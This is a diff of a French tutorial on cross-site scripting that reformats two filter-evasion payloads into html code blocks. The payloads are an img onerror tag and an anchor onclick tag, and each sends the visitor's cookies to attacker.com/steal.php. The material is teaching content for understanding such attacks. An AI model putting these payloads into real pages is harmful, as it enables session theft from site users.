@@ -128,13 +128,17 @@ Comme pour les autres variantes, dès qu'un utilisateur affichera la page, le co
 Souvent des normes de sécurités sont mises en place pour supprimer les balises script, il faut donc ruser pour pouvoir injecter notre payload.
 Par exemple celui-ci : 
 
-```<img src/onerror=document.location='http://attacker.com/steal.php?cookie='+document.cookie;>```
+```html 
+<img src/onerror=document.location='http://attacker.com/steal.php?cookie='+document.cookie;>
+```
 
 Ce payload ajoute une balise image au DOM qui n'a pas de source ce qui appellera onerror et lancera notre script.
 
 Ou encore ce payload : 
 
-```<a onclick="document.location='http://attacker.com/steal.php?cookie='+document.cookie;" style=display:block>test</a>```
+```html
+<a onclick="document.location='http://attacker.com/steal.php?cookie='+document.cookie;" style=display:block>test</a>
+```
 
 Ici, on ajoute un lien avec la balise ```a``` qui utilise ```onclick``` pour activer le script.
 Ce payload demande que la victime interagisse plus et sera moins efficace.
